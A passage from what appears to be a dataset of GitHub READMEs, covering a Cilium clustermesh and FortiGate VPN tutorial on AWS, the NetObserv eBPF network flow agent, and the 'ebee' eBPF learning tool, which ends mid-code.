terraform init
terraform apply 
```
Repeat the process for AWS region `eu-west-1` (fgtsingle2)<br>
Give it some minutes. The `terraform output` will provide login details and IP address of the Fortigates.

## Configuring the Fortigates
### Create an allow_all outbound rule
<details>
<summary>Create on both firewall an address resource representing the private networks.</summary>
- eu-west-3 (fgtsingle1) -> 10.1.1.0/24<br>
- eu-west-1 (fgtsingle2) -> 10.2.1.0/24<br>
<br>
<br>
<p align=""center"">
<img src=""./images/private_network.png""  width=""600"" />
</p> <br>
</details>
<details>
  <summary>Create an outbound firewall rule.</summary>
<p align=""center"">
<img src=""./images/allow-all.png""  width=""600"" align=""center"" /><br><br>
<img src=""./images/allow-all-rule.png""  width=""1000"" align=""center"" />
</p> <br>
</details>

### Create a VPN IPSEC tunnel
<details>
<summary>IPSEC VPN setup using VPN wizard</summary>

<p align=""center"">
<img src=""./images/vpn-setup-1.png""  width=""1000"" align=""center"" /><br>
<img src=""./images/vpn-setup-2.png""  width=""1000"" align=""center"" /><br>
<img src=""./images/vpn-setup-3.png""  width=""1000"" align=""center"" /><br>
<img src=""./images/vpn-setup-4.png""  width=""1000"" align=""center"" /><br>
</p> <br>
</details>

## Deploying Kubernetes and jumpbox
In the next step, a 3-node Kubernetes cluster is deployed, together with a jumpbox and backend test server.<br>
Rename `terraform.tfvars.example` to `terraform.tfvars` and populate the variables.<br>
The information can be obtained from the `terraform output` for both fortigate deployments.
```
cd terraform-k8s-1
terraform init
terraform apply
```
Repeat process for terraform-k8s-2.<br>
Wait for a few minutes for all boxes to initialise.<br><br>
Then run in both terraform-k8s-1 and terraform-k8s-2 folder:
```
creds.sh 1
```
 Wait for a few minutes for all boxes to initialise.<br><br>
You can now access the jumpboxes in both regions
```
ssh -i key0.pem ubuntu@<jumpbox>
```
From the jumpbox, you can access the k8s master nodes
```
ssh -i key.pem ubuntu@<k8s_master>
```
You can always find the IP addresses by running
```
terraform output
```
It should look like
```
backend_private_ip = [
  ""10.1.1.203"",
]
instancecount = 1
jumbox_public_ip = [
  ""15.246.227.203"",
]
k8nodes_private_ip = [
  [
    ""10.1.1.214"",
    ""10.1.1.51"",
  ],
]
k8smaster_private_ip = [
  ""10.1.1.143"",
]
private_key = <sensitive>
worker_count = 2
```

## Deploying the clustermesh
### Install pre-requisite tooling
On both clusters:
<details>
<summary>Install required tooling </summary>

```
CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
CLI_ARCH=amd64
if [ ""$(uname -m)"" = ""aarch64"" ]; then CLI_ARCH=arm64; fi
curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
sudo tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}



export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)
curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}
sha256sum --check hubble-linux-amd64.tar.gz.sha256sum
sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin
rm hubble-linux-amd64.tar.gz{,.sha256sum}

sudo snap install helm --classic
helm repo add cilium https://helm.cilium.io/
```
</details>

### Install Cilium CNI on cluster1
```
helm install cilium cilium/cilium --version 1.14.2 \
    --namespace kube-system \
    --set authentication.mutual.spire.enabled=true \
    --set authentication.mutual.spire.install.enabled=true \
    --set hubble.relay.enabled=true \
    --set hubble.ui.enabled=true \
    --set encryption.enabled=true \
    --set encryption.type=wireguard \
    --set kube-proxy-replacement=strict \
    --set ingressController.enabled=partial \
    --set ingressController.loadbalancerMode=shared \
    --set ingressController.service.type=""NodePort"" \
    --set loadBalancer.l7.backend=envoy \
    --set auto-create-cilium-node-resource=true \
    --set ipam.operator.clusterPoolIPv4PodCIDRList=""10.10.0.0/16"" \
    --set ipam.operator.clusterPoolIPv4MaskSize=""24"" \
    --set ipam.mode=cluster-pool \
    --set cluster.id=1 \
    --set cluster.name=""cluster1""
```
### Install Cilium CNI on cluster2
```
helm install cilium cilium/cilium --version 1.14.2 \
    --namespace kube-system \
    --set authentication.mutual.spire.enabled=true \
    --set authentication.mutual.spire.install.enabled=true \
    --set hubble.relay.enabled=true \
    --set hubble.ui.enabled=true \
    --set encryption.enabled=true \
    --set encryption.type=wireguard \
    --set kube-proxy-replacement=strict \
    --set ingressController.enabled=partial \
    --set ingressController.loadbalancerMode=shared \
    --set ingressController.service.type=""NodePort"" \
    --set loadBalancer.l7.backend=envoy \
    --set auto-create-cilium-node-resource=true \
    --set ipam.operator.clusterPoolIPv4PodCIDRList=""10.12.0.0/16"" \
    --set ipam.operator.clusterPoolIPv4MaskSize=""24"" \
    --set ipam.mode=cluster-pool \
    --set cluster.id=2 \
    --set cluster.name=""cluster2""
```
### Enable the clustermesh service
On both clusters:
```
cilium clustermesh enable --service-type NodePort
```
### Create a kubeconfig with access to both clusters
Combine both `.kube/config` files
- make sure cluster names are different
- make sure usernames are different
- make sure context names are different
<br>

Follow these steps:<br>
On **cluster1**
```
cp .kube/config cluster1.yaml
```
```
touch cluster2.yaml
```
copy/paste `.kube/config` content (cluster2) into `cluster2.yaml`<br>
We now have a copy of both kubeconfig files stored in respectively `cluster1.yaml` and `cluster2.yaml`<r>
<br>

### Create unique context, user and cluster references in both files
```
sed -i 's/kubernetes/kubernetes1/g' cluster1.yaml
sed -i 's/kubernetes/kubernetes2/g' cluster2.yaml
```
### Load the KUBECONFIG 
```
export KUBECONFIG=$PWD/cluster1.yaml:$PWD/cluster2.yaml
```
```
~$ kubectl config get-contexts
CURRENT   NAME                           CLUSTER       AUTHINFO            NAMESPACE
*         kubernetes1-admin@kubernetes1   kubernetes1   kubernetes-admin1
          kubernetes2-admin@kubernetes2   kubernetes2   kubernetes-admin2
```
### Connect both clusters
```
cilium clustermesh connect --context kubernetes1-admin@kubernetes1 --destination-context kubernetes2-admin@kubernetes2
```
## Deploy demo app
Deploy a demo app, based on [https://github.com/xxradar/app_routable_demo](https://github.com/xxradar/app_routable_demo) on **both K8S clusters**
```
git clone https://github.com/xxradar/app_routable_demo.git
cd ./app_routable_demo
./setup.sh
watch kubectl get po -n app-routable-demo -o wide
```

### Optionally: 
configure Cilium Ingress
```
kubectl apply -f ./app_routable_demo/ingress_cilium.yaml
```
Additionally, you need to create a firewall rule allowing access from the internet towards the ingress nodeports.
<p align=""center"">
<img src=""./images/ingress-fw-rule.png""  width=""1000"" align=""center"" /><br>
</p> 

- Fortigate provides basic L4 load-balancing through the Virtual server load balance feature
- Fortigate supports an AWS (and Kubernetes) SDN connector to dynamically populate the K8S nodes.
- Support for IPS (and other NG features) and basic WAF capabilities.

<p align=""center"">
<img src=""./images/load-balancer.png""  width=""400"" align=""center"" /><br>
</p> 

## Testing the clustermesh
### App architecture
The ultimate goal is to create following app deployment.<br>
<p align=""center"">
<img src=""./images/microservice-mesh.png""  width=""600"" align=""center"" /><br>
</p> <br>
Currently the application is not **globably shared`** accross both clusters.

### Connectivity test w/o service sharing
On both clusters, run following test:
```
kubectl run -it -n app-routable-demo --rm --image xxradar/hackon mycurler -- bash
       curl -v -H ""Cookie: loc=client"" http://zone1/app3
```

<details>
<summary>Result cluster1 </summary><br>

```
root@mycurler:/# curl -v -H ""Cookie: loc=client"" http://zone1/app3
*   Trying 10.100.23.232:80...
* Connected to zone1 (10.100.23.232) port 80 (#0)
> GET /app3 HTTP/1.1
> Host: zone1
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: loc=client
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.25.2
< Date: Tue, 19 Sep 2023 10:44:51 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 600
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/""258-zGzwAESu1cvKemzgO8W6mCBaWZQ""
<
{
  ""path"": ""/app3"",
  ""headers"": {
    ""x-forwarded-for"": ""10.10.2.91, 10.10.2.183, 10.10.1.240"",
    ""cookie"": ""loc=client, loc=zone1, loc=zone3, loc=zone5"",
    ""host"": ""zone7"",
    ""connection"": ""close"",
    ""user-agent"": ""curl/7.81.0"",
    ""accept"": ""*/*""
  },
  ""method"": ""GET"",
  ""body"": """",
  ""fresh"": false,
  ""hostname"": ""zone7"",
  ""ip"": ""10.10.2.91"",
  ""ips"": [
    ""10.10.2.91"",
    ""10.10.2.183"",
    ""10.10.1.240""
  ],
  ""protocol"": ""http"",
  ""query"": {},
  ""subdomains"": [],
  ""xhr"": false,
  ""os"": {
    ""hostname"": ""echoserver-2-deployment-6f499cfbbb-7kztt""
  },
  ""connection"": {}
* Connection #0 to host zone1 left intact
}
```
  
</details>

<details>
<summary>Result cluster2 </summary><br>

```
root@mycurler:/# curl -v -H ""Cookie: loc=client"" http://zone1/app3
*   Trying 10.96.245.46:80...
* Connected to zone1 (10.96.245.46) port 80 (#0)
> GET /app3 HTTP/1.1
> Host: zone1
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: loc=client
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.25.2
< Date: Tue, 19 Sep 2023 10:44:49 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 593
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/""251-IE7zC2Tif6dhLPEYr0JMi8HMYYM""
<
{
  ""path"": ""/app3"",
  ""headers"": {
    ""x-forwarded-for"": ""10.12.2.8, 10.12.0.40, 10.12.2.16"",
    ""cookie"": ""loc=client, loc=zone1, loc=zone3, loc=zone5"",
    ""host"": ""zone7"",
    ""connection"": ""close"",
    ""user-agent"": ""curl/7.81.0"",
    ""accept"": ""*/*""
  },
  ""method"": ""GET"",
  ""body"": """",
  ""fresh"": false,
  ""hostname"": ""zone7"",
  ""ip"": ""10.12.2.8"",
  ""ips"": [
    ""10.12.2.8"",
    ""10.12.0.40"",
    ""10.12.2.16""
  ],
  ""protocol"": ""http"",
  ""query"": {},
  ""subdomains"": [],
  ""xhr"": false,
  ""os"": {
    ""hostname"": ""echoserver-2-deployment-6f499cfbbb-fqh25""
  },
  ""connection"": {}
* Connection #0 to host zone1 left intact
}root@mycurler:/# curl -v -H ""Cookie: loc=client"" http://zone1/app3
*   Trying 10.96.245.46:80...
* Connected to zone1 (10.96.245.46) port 80 (#0)
> GET /app3 HTTP/1.1
> Host: zone1
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: loc=client
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.25.2
< Date: Tue, 19 Sep 2023 10:44:49 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 593
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/""251-IE7zC2Tif6dhLPEYr0JMi8HMYYM""
<
{
  ""path"": ""/app3"",
  ""headers"": {
    ""x-forwarded-for"": ""10.12.2.8, 10.12.0.40, 10.12.2.16"",
    ""cookie"": ""loc=client, loc=zone1, loc=zone3, loc=zone5"",
    ""host"": ""zone7"",
    ""connection"": ""close"",
    ""user-agent"": ""curl/7.81.0"",
    ""accept"": ""*/*""
  },
  ""method"": ""GET"",
  ""body"": """",
  ""fresh"": false,
  ""hostname"": ""zone7"",
  ""ip"": ""10.12.2.8"",
  ""ips"": [
    ""10.12.2.8"",
    ""10.12.0.40"",
    ""10.12.2.16""
  ],
  ""protocol"": ""http"",
  ""query"": {},
  ""subdomains"": [],
  ""xhr"": false,
  ""os"": {
    ""hostname"": ""echoserver-2-deployment-6f499cfbbb-fqh25""
  },
  ""connection"": {}
* Connection #0 to host zone1 left intact
}
```
  
</details>

### Connectivity test global service sharing
Annotate a service (zone1)
```
  annotations:
    service.cilium.io/global: ""true""
    service.cilium.io/shared: ""true""
```
You can test this:
```
kubectl run -it -n app-routable-demo --rm --image xxradar/hackon mycurler -- bash
       curl -v -H ""Cookie: loc=client"" http://zone1/app3
```

<details>
<summary>Result cluster1 </summary><br>

```
root@mycurler:/# curl -v -H ""Cookie: loc=client"" http://zone1/app3
*   Trying 10.100.210.61:80...
* Connected to zone1 (10.100.210.61) port 80 (#0)
> GET /app3 HTTP/1.1
> Host: zone1
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: loc=client
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.25.2
< Date: Tue, 19 Sep 2023 10:36:10 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 599
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/""257-8F7QuYIPBkqxghJh0J7OdGFUAJY""
<
{
  ""path"": ""/app3"",
  ""headers"": {
    ""x-forwarded-for"": ""10.10.2.159, 10.12.0.40, 10.12.2.16"",
    ""cookie"": ""loc=client, loc=zone1, loc=zone3, loc=zone5"",
    ""host"": ""zone7"",
    ""connection"": ""close"",
    ""user-agent"": ""curl/7.81.0"",
    ""accept"": ""*/*""
  },
  ""method"": ""GET"",
  ""body"": """",
  ""fresh"": false,
  ""hostname"": ""zone7"",
  ""ip"": ""10.10.2.159"",
  ""ips"": [
    ""10.10.2.159"",
    ""10.12.0.40"",
    ""10.12.2.16""
  ],
  ""protocol"": ""http"",
  ""query"": {},
  ""subdomains"": [],
  ""xhr"": false,
  ""os"": {
    ""hostname"": ""echoserver-2-deployment-6f499cfbbb-f754s""
  },
  ""connection"": {}
* Connection #0 to host zone1 left intact
}
```
  
</details>

<details>
<summary>Result cluster2 </summary><br>

```
root@mycurler:/# curl -v -H ""Cookie: loc=client"" http://zone1/app3
*   Trying 10.98.218.19:80...
* Connected to zone1 (10.98.218.19) port 80 (#0)
> GET /app3 HTTP/1.1
> Host: zone1
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: loc=client
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.25.2
< Date: Tue, 19 Sep 2023 10:38:01 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 603
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/""25b-Sh6Qc2jjVtVZLUmH1G3UFezpX0E""
<
{
  ""path"": ""/app3"",
  ""headers"": {
    ""x-forwarded-for"": ""10.12.2.122, 10.10.2.183, 10.10.1.240"",
    ""cookie"": ""loc=client, loc=zone1, loc=zone3, loc=zone5"",
    ""host"": ""zone7"",
    ""connection"": ""close"",
    ""user-agent"": ""curl/7.81.0"",
    ""accept"": ""*/*""
  },
  ""method"": ""GET"",
  ""body"": """",
  ""fresh"": false,
  ""hostname"": ""zone7"",
  ""ip"": ""10.12.2.122"",
  ""ips"": [
    ""10.12.2.122"",
    ""10.10.2.183"",
    ""10.10.1.240""
  ],
  ""protocol"": ""http"",
  ""query"": {},
  ""subdomains"": [],
  ""xhr"": false,
  ""os"": {
    ""hostname"": ""echoserver-2-deployment-6f"
netobserv/netobserv-ebpf-agent,185,49,185,9,C,Network Observability eBPF Agent,2022-03-07T09:55:49Z,2025-10-06T07:39:07Z,620,"# Network Observability eBPF Agent

[![Go Report Card](https://goreportcard.com/badge/github.com/netobserv/netobserv-ebpf-agent)](https://goreportcard.com/report/github.com/netobserv/netobserv-ebpf-agent)

The Network Observability eBPF Agent allows collecting and aggregating all the ingress and
egress flows on a Linux host (required a Kernel 5.8+ with eBPF enabled).

* [How to build](#how-to-build)
* [How to configure](#how-to-configure)
* [How to run](#how-to-run)
* [Development receipts](#development-receipts)
* [Known issues](#known-issues)
* [Frequently-asked questions](#frequently-asked-questions)
* [Troubleshooting](#troubleshooting)

## How to build

To build the agent image and push it to your Docker / Quay repository, run:
```bash
# compile project
make build

# build the default image (quay.io/netobserv/netobserv-ebpf-agent:main):
make image-build

# push the default image (quay.io/netobserv/netobserv-ebpf-agent:main):
make image-push

# build and push on your own quay.io account (quay.io/myuser/netobserv-ebpf-agent:dev):
IMAGE_ORG=myuser VERSION=dev make images

# build and push on a different registry
IMAGE=dockerhub.io/myuser/plugin:tag make images
```

## How to configure

The eBPF Agent is configured by means of environment variables. Check the
[configuration documentation](./docs/config.md) for more details.

## How to run

The NetObserv eBPF Agent is designed to run as a DaemonSet in OpenShift/K8s. It is triggered and
configured by our [Network Observability Operator](https://github.com/netobserv/network-observability-operator).

Anyway you can run it directly as an executable from your command line:

```bash
export TARGET_HOST=...
export TARGET_PORT=...
sudo -E bin/netobserv-ebpf-agent
```

We don't recommend using the agent's IPFIX exporter mode as it is not actively maintained (if you're interested in maintaining it, let us know!). Note that flowlogs-pipeline can also generate IPFIX exports, so a valid way to get IPFIX data is to export to flowlogs-pipeline (via GRPC, Kafka or direct-flp) and then configure IPFIX within flowlogs-pipeline.

A simple way to try the agent is using the `direct-flp` export mode, printing directly to stdout:

Given the following file `flp-config.json`:

```json
{
	""pipeline"":[
		{""name"": ""writer"",""follows"": ""preset-ingester""}
	],
	""parameters"":[
		{""name"": ""writer"",""write"": {""type"": ""stdout""}}
	]
}
```
Run:

```bash
export FLP_CONFIG=$(cat flp-config.json)
export EXPORT=""direct-flp""
sudo -E bin/netobserv-ebpf-agent
```

For more information about configuring flowlogs-pipeline, please refer to [its documentation](https://github.com/netobserv/flowlogs-pipeline).

To deploy locally, use instructions from [flowlogs-dump (like tcpdump)](./examples/flowlogs-dump/README.md).    
To deploy it as a Pod, you can check the [deployment examples](./deployments).

The Agent needs to be executed either with:

1. The following [Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html):
   - `BPF`: Needed to use eBPF programs and maps.
   - `PERFMON`: Needed to access perf monitoring and profiling features.
   - `NET_ADMIN`: Needed for TC programs to attach/detach to/from qdisc and for TCX hooks.

   If you [deploy it in Kubernetes or OpenShift](./deployments/flp-daemonset-cap.yml),
   the container running the Agent needs to define the following `securityContext`:
   ```yaml
   securityContext:
     runAsUser: 0
     capabilities:
       add:
         - BPF
         - PERFMON
         - NET_ADMIN
   ```
   (Please notice that the `runAsUser: 0` is still needed).
2. Or full administrative privileges. If you
   [deploy it in Kubernetes or OpenShift](./deployments/flp-daemonset.yml),
   the container running the Agent needs to define the following `securityContext`:
   ```yaml
   securityContext:
     privileged: true
     runAsUser: 0
   ```

While the first option is safer (principle of least privilege), it also has its drawbacks, notably that you can't monitor all secondary interfaces. Full privileged mode may also be needed if running on a Linux kernel that does not recognize some of the above capabilities (some older Kubernetes distributions might not recognize the `BPF` and `PERFMON` capabilities).

Here is a list of distributions where we tested both full privileges and capability approaches,
and whether they worked (âœ…) or did not (âŒ):

| Distribution                  | K8s Server version | Capabilities | Privileged |
|-------------------------------|--------------------|--------------|------------|
| Amazon EKS (Bottlerocket AMI) | 1.22.6             | âœ…            | âœ…          |
| K3s (Rancher Desktop)         | 1.23.5             | âŒ            | âœ…          |
| Kind                          | 1.23.5             | âŒ            | âœ…          |
| OpenShift                     | 1.23.3             | âœ…            | âœ…          |

## Running on KinD cluster

### How to run on kind cluster

Install KinD and the ebpf agent and export KUBECONFIG
```sh
make create-and-deploy-kind-cluster
export KUBECONFIG=$(pwd)/scripts/kubeconfig
```

### Deleting the kind cluster

In order to delete the kind cluster:
```sh
make destroy-kind-cluster
```

## Development receipts

### How to regenerate the eBPF Kernel binaries

The eBPF program is embedded into the `pkg/ebpf/bpf_*` generated files.
This step is generally not needed unless you change the C code in the `bpf` folder.

If you have Docker installed, you just need to run:

```bash
make docker-generate
```

If you can't install docker, you can install locally the following packages, then run `make generate`:

```bash
dnf install -y kernel-devel make llvm clang glibc-devel.i686
make generate
```

Regularly tested on Fedora.

### Running end-to-end tests

Refer to the specific documentation: [e2e readme](./e2e/README.md)

## Known issues

### Extrenal Traffic in Openshift (OVN-Kubernetes CNI)

For egress traffic, you can see the source Pod metadata. For ingress traffic (e.g. an HTTP response),
you see the destination **Host** metadata.

## Frequently-asked questions

### Where is the collector?

As part of our Network Observability solution, the eBPF Agent is designed to send the traced
flows to our [Flowlogs Pipeline](https://github.com/netobserv/flowlogs-pipeline) component.

In addition, we provide a simple GRPC+Protobuf library to allow implementing your own collector.
Check the [packet counter code](./examples/performance/server/packet-counter-collector.go)
for an example of a simple collector using our library.

## Troubleshooting

### Deployed as a Kubernetes Pod, the agent shows permission errors in the logs and can't start

In your [deployment file](./deployments/flp-daemonset-cap.yml), make sure that the container runs as
the root user (`runAsUser: 0`) and with the granted capabilities or privileges (see [how to run](#how-to-run) section).

### The Agent doesn't work in my Amazon EKS puzzle

Despite Amazon Linux 2 enables eBPF by default in EC2, the
[EKS images are shipped with disabled eBPF](https://github.com/awslabs/amazon-eks-ami/issues/728).

You'd need either:

1. Provide your own AMI configured to work with eBPF
2. Use other Linux distributions that are shipped with eBPF enabled by default. We have successfully
   tested the eBPF Agent in EKS with the [Bottlerocket](https://aws.amazon.com/es/bottlerocket/)
   Linux distribution, without requiring any extra configuration.

## Licenses

Two licenses are used for the source code in this repository:

- [GPL v2](./bpf/LICENSE) covers the eBPF code in `./bpf` directory.
- [Apache v2](./LICENSE) covers everything else.

## Discussions and contributions

Discussions related to NetObserv are welcome on [GitHub discussions](https://github.com/orgs/netobserv/discussions) as well as on the [#netobserv-project](http://cloud-native.slack.com/) channel from CNCF slack.

If you'd like to reach out because you've found a security issue, please do not share sensitive details publicly. Please follow the instructions described on the [Red Hat Customer Portal](https://access.redhat.com/security/team/contact/?extIdCarryOver=true&sc_cid=701f2000001Css5AAC).

Refer to the [NetObserv projects contribution guide](https://github.com/netobserv/documents/blob/main/CONTRIBUTING.md) for more details on contributions.
"
xmigrate/ebee,12,3,12,0,C,CLI tool for eBPF application development,2023-09-06T05:46:33Z,2025-10-11T20:15:45Z,18,"# ebee - eBPF the Hard Way!

This repository contains various eBPF tools originally from the BCC project, reimplemented from scratch to help users learn eBPF development step by step.

## ðŸŽ¯ Project Goal

The idea for this project is to help users learn creating eBPF tools with a comprehensive step-by-step guide. Each tool includes detailed documentation explaining the underlying concepts, kernel hooks, data structures, and implementation details.

## ðŸ§  What is eBPF?

eBPF (extended Berkeley Packet Filter) is a revolutionary technology that allows you to run sandboxed programs in the Linux kernel without changing kernel source code or loading kernel modules. It enables:

- **Real-time system monitoring** - Track processes, files, network activity
- **Performance analysis** - Measure latency, throughput, resource usage  
- **Security monitoring** - Detect malicious behavior and policy violations
- **Custom debugging** - Create tailored debugging tools for your applications

## ðŸŽ“ What You'll Learn

By working through this project, you'll gain hands-on experience with:

- **eBPF fundamentals** - Understanding the eBPF virtual machine and verifier
- **Kernel programming** - Writing C programs that run in kernel space
- **Tracepoints and kprobes** - Hooking into kernel events and functions
- **Data structures** - Using eBPF maps for efficient data sharing
- **Go integration** - Building userspace applications with the Cilium eBPF library
- **Performance optimization** - Creating efficient monitoring tools
- **Security analysis** - Building tools for system security and compliance

## âš™ï¸ Prerequisites

### System Requirements
- **Linux Kernel**: 4.18+ (5.0+ recommended for full feature support)
- **Architecture**: x86_64, arm64
- **BTF Support**: Required for modern eBPF development
- **Root Access**: Required for loading eBPF programs

## ðŸš€ Quick Start

### Prerequisites Setup

#### Linux
```bash
# Install all requirements using the Makefile
make install
```

#### macOS
Since eBPF development requires Linux kernel headers and tools, we use Lima to run Ubuntu:

```bash
# Install/upgrade Lima + guest agents
brew install lima lima-additional-guestagents || brew upgrade lima lima-additional-guestagents

# Start Ubuntu VM with our configuration
limactl start scripts/default.yaml --name=default --timeout 30m

# Connect to the VM
limactl shell default

# Now run the Linux setup
make install
```

### Build ebee

```bash
# Generate kernel headers (required for eBPF development)
make gen_vmlinux

# Install dependencies and build
make deps
make build
```

## ðŸ”§ Quick Examples

```bash
# Monitor all process executions
sudo ./ebee execsnoop

# Monitor file deletions  
sudo ./ebee rmdetect

# Filter by specific process
sudo ./ebee execsnoop --comm bash
```

## ðŸ“š Available Tools

| Tool | Status | Category | Description | Kernel Hook |
|------|--------|----------|-------------|-------------|
| **execsnoop** | âœ… Available | Process Monitoring | Monitor process executions in real-time | `sched_process_exec` tracepoint |
| **rmdetect** | âœ… Available | File System | Monitor file deletions in real-time | `ext4_free_inode` tracepoint |
| **opensnoop** | ðŸš§ Planned | File System | Monitor file opens in real-time | `vfs_open` kprobe |
| **tcpconnect** | ðŸš§ Planned | Network | Monitor TCP connections | `tcp_connect` kprobe |
| **tcpaccept** | ðŸš§ Planned | Network | Monitor TCP accepts | `tcp_accept` kprobe |
| **biolatency** | ðŸš§ Planned | Storage | Monitor block I/O latency | `block_rq_insert/complete` |
| **syscount** | ðŸš§ Planned | System | Count system calls by process | syscall tracepoints |
| **funclatency** | ðŸš§ Planned | Performance | Measure function latency | kprobes/kretprobes |
| **stackcount** | ðŸš§ Planned | Performance | Count stack traces | perf events |
| **profile** | ðŸš§ Planned | Performance | CPU profiling | perf events |

### Tool Categories

- **Process Monitoring** - Track process lifecycle and execution
- **File System** - Monitor file operations and changes  
- **Network** - Analyze network connections and traffic
- **Storage** - Monitor disk I/O and storage performance
- **System** - Track system calls and kernel events
- **Performance** - Measure latency, throughput, and resource usage

Each tool includes comprehensive documentation in the `docs/` folder with implementation details, usage examples, and troubleshooting guides.

## ðŸ› ï¸ Development

### Adding New Commands

1. **Create the eBPF C program** in `bpf/your_tool.c`
2. **Create the Go command** in `cmd/your_tool.go`
3. **Update Makefile** generate target to include your C file
4. **Add documentation** in `docs/your_tool.md` following the template
5. **Update this README** to include your new tool

### Documentation Structure

Each tool should include:
- **What it does** - Purpose and use cases
- **How it works** - Technical implementation details
- **Kernel hooks used** - Which tracepoints/kprobes are attached
- **Data structures** - eBPF maps and event structures
- **Step-by-step guide** - Implementation walkthrough
- **Usage examples** - Command-line examples

## ðŸ“– Documentation

Comprehensive documentation covering everything from basics to advanced production deployment:

### ðŸ“š **Learning Materials**
- **[Complete Documentation](docs/)** - Full learning guide
- **[Getting Started](docs/getting-started/what-is-ebpf.md)** - Environment setup and eBPF introduction
- **[Core Concepts](docs/fundamentals/concepts.md)** - eBPF fundamentals and architecture
- **[First Tool Tutorial](docs/first-tool/architecture.md)** - Step-by-step tool creation

### ðŸš€ **Advanced Topics**
- **[CO-RE & BTF](docs/advanced/core-btf.md)** - Portable eBPF development with CO-RE
- **[Network Programming](docs/advanced/network-ebpf.md)** - XDP, TC, packet processing
- **[Security Monitoring](docs/advanced/security-monitoring.md)** - LSM hooks, security events
- **[Testing Strategies](docs/advanced/testing.md)** - Unit/integration testing frameworks
- **[Performance Optimization](docs/advanced/performance.md)** - Production optimization techniques

### ðŸ› ï¸ **Tool Documentation**
- **[execsnoop](docs/tools/execsnoop.md)** - Process execution monitoring
- **[rmdetect](docs/tools/rmdetect.md)** - File deletion detection
- **[Network Tools](docs/advanced/network-ebpf.md)** - DDoS protection, load balancing
- **[Security Tools](docs/advanced/security-monitoring.md)** - File access, process monitoring

### ðŸ“‹ **Reference & Troubleshooting**
- **[Troubleshooting Guide](docs/reference/troubleshooting.md)** - Debug techniques, common issues
- **[Best Practices](docs/reference/best-practices.md)** - Production deployment patterns
- **[API Reference](docs/reference/api.md)** - Helper functions and APIs

## ðŸ—ï¸ Project Structure

```
ebee/
â”œâ”€â”€ cmd/                    # CLI commands
â”œâ”€â”€ bpf/                   # eBPF C programs
â”‚   â””â”€â”€ headers/           # BPF headers
â”œâ”€â”€ docs/                  # Documentation
â”‚   â”œâ”€â”€ tools/            # Tool-specific docs
â”‚   â””â”€â”€ development-setup.md
â”œâ”€â”€ scripts/              # Setup scripts
â”œâ”€â”€ main.go               # Application entry point
â””â”€â”€ Makefile              # Build and development tasks
```

## ðŸ¤ Contributing

We welcome contributions! Whether you're fixing bugs, adding new tools, or improving documentation, your help makes this project better for everyone.

### ðŸš€ Quick Start for Contributors

1. **Fork and clone** the repository
2. **Set up your development environment** following our [Development Setup Guide](docs/development-setup.md)
3. **Pick an issue** or propose a new tool from our [planned tools table](#-available-tools)
4. **Follow our contribution guidelines** below

### ðŸ“‹ Contribution Types

#### ðŸ”§ Adding New eBPF Tools
Perfect for learning eBPF development:

**Step-by-step process:**
1. **Choose a tool** from our planned tools table or propose a new one
2. **Create an issue** describing the tool's purpose and implementation approach
3. **Implement the tool** following our patterns:
   ```bash
   # 1. Create eBPF C program
   touch bpf/yourtool.c
   
   # 2. Create Go command
   mkdir -p cmd
   touch cmd/yourtool.go
   
   # 3. Add to Makefile generate target
   # 4. Create documentation
   touch docs/tools/yourtool.md
   ```
4. **Test thoroughly** on multiple kernel versions
5. **Submit a pull request** with comprehensive documentation

#### ðŸ“– Documentation Improvements
Great for first-time contributors:
- Fix typos or unclear explanations
- Add more examples and use cases
- Improve troubleshooting guides
- Translate documentation

#### ðŸ› Bug Fixes
Help make the project more reliable:
- Fix compilation issues
- Resolve runtime errors
- Improve error handling
- Fix documentation inconsistencies

#### âš¡ Performance Optimizations
For advanced contributors:
- Optimize eBPF program efficiency
- Improve memory usage
- Reduce kernel/userspace communication overhead

### ðŸ“ Code Standards

#### eBPF C Code
```c
// File header with purpose
#include ""common.h""

// Clear data structures with comments
struct data_t {
    u32 pid;        // Process ID
    char comm[16];  // Command name
};

// Descriptive function names
SEC(""tracepoint/category/event"")
int trace_event_name(struct trace_event_raw_event *ctx) {
    // Error handling first
    struct data_t *data = bpf_ringbuf_reserve(&events, sizeof(struct data_t), 0);
    if (!data) {
        return 0;
    }
    
    // Clear logic with safe memory access
    data->pid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    bpf_get_current_comm(&data->comm, sizeof(data->comm));
    
    bpf_ringbuf_submit(data, 0);
    return 0;
}

char _license[] SEC(""license"") = ""GPL"";
```

#### Go Code
```go
// Follow Go conventions
var toolCmd = &cobra.Command{
    Use:   ""toolname"",
